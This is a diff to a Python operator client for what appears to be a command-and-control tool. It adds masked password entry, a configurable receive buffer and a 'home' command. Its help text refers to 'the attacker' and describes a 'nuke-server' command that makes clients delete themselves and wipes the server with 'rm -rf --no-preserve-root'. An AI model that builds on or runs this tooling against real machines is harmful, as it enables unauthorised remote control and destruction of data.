@@ -1,6 +1,7 @@
 import socket
 import os
 import select
+import maskpass
 
 global_debug = False
 
@@ -9,6 +10,7 @@ class fclient():
 
     def __init__(self):
         self.encoding = 'utf-8'
+        self.buffer = 1024
         
     
     def connect_to_server(self):
@@ -48,13 +50,15 @@ class fclient():
 
     ##directly interacting with the server
     def server_interact(self):
+        
         ## Populating the lists needed & getting info from server
         self.server_info_fetch()
         ## This will be returned to the client later
         
         ## dict - can't do .lower() due to client names being capataliezed. fuck
-        client_name = input("Enter a client name to interact, 'help', or 'refresh': ")#.lower()
 
+        client_name = input("Enter a client name to interact, 'help', or 'refresh': ")#.lower()
+        print(f"CLient Name: {client_name}")
         ################
         ## Home Menu
         ################ 
@@ -103,7 +107,12 @@ class fclient():
             while True:
                 ## 'response =' instead of a direct print so I can pass the variable easier/shorter
                 response = self.client_interact_through_server(input(f"{client_name}@127.0.0.1:6969$: "), client_name)
-                print(response)
+                if response == "home":
+                    pass
+                    ## atempt at making this go back to the first prompt
+                    #self.server_interact()
+                else:
+                    print(response)
                 
             #print("Valid Client. Control not implemented")
             #print("DEBUG: client is in the client list!") if global_debug else None
@@ -174,6 +183,9 @@ class fclient():
                 f"Emergency Comands: \n  - use for EMERGENCIES ONLY, there is no favorable outcome for the attacker with these" \
                 f"nuke-server: Kills the server, tells the clients to delete themselves, and runs 'rm-rf --no-preserve-root' the server machine. "
             )
+
+        elif client_command == "home" or client_command == "exit":
+            return "home"
 
         # == Static, From server
         elif "get-data" in client_command:
@@ -270,7 +282,7 @@ class fclient():
         HEADERSIZE = 10
 
         while True:
-            msg = self.server.recv(32) ##<< adjustble, how many bytes you want to get per iteration
+            msg = self.server.recv(int(self.buffer)) ##<< adjustble, how many bytes you want to get per iteration
             if new_msg:
                 ## Carving up msg into the first X bytes (X = headersize)
                 msglen = int(msg[:HEADERSIZE])
@@ -298,7 +310,7 @@ class fclient():
         creds_list = [str, str]
         
         creds_list[0] = input("Username: ")
-        creds_list[1] = input("Password: ")
+        creds_list[1] = maskpass.askpass()#input("Password: ")
 
         self.username = creds_list[0]
     
